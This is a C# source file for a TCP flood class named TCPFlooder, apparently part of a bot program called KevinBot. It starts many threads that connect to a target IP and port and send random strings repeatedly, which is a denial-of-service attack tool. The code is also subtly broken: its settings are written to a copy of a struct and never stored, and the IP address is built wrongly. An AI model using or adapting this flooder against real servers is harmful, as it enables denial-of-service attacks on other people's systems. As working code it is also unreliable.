using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Threading;

namespace KevinBot.App
{
    public class TCPFlooder
    {
        IDManager IDManager = new IDManager();
        private struct Settings
        {
            public string IP;
            public int Requests;
            public int Port;
        }
        Settings S = new Settings();
        List<Thread> ThreadList;
        public void Setup(string IP, int Port, int Requests, int Threads)
        {
            ThreadList = new List<Thread>();
            var _with1 = S;
            _with1.IP = IP;
            _with1.Requests = Requests;
            _with1.Port = Port;
            for (int x = 0; x <= Threads; x++)
            {
                ThreadList.Add(new Thread(Start));
                ThreadList[x].Start();
            }
        }
        private void Start()
        {
            IPEndPoint IPEndPoit = new IPEndPoint(new IPAddress(Encoding.ASCII.GetBytes(S.IP)), S.Port);
            TcpClient TcpClient = new TcpClient();
            string Message = IDManager.GetRandomID(10);
            NetworkStream NetworkStream = default(NetworkStream);
            StreamWriter StreamWriter = default(StreamWriter);

            //Connect
            try
            {
                TcpClient.Connect(IPEndPoit);
            }
            catch
            {
            }

            NetworkStream = TcpClient.GetStream();
            StreamWriter = new StreamWriter(NetworkStream);

            int current = 0;
            while ((current <= S.Requests))
            {
                current = current + 1;

                try
                {
                    StreamWriter.WriteLine(Message);
                    StreamWriter.Flush();
                }
                catch
                {
                }

            }
        }
    }
}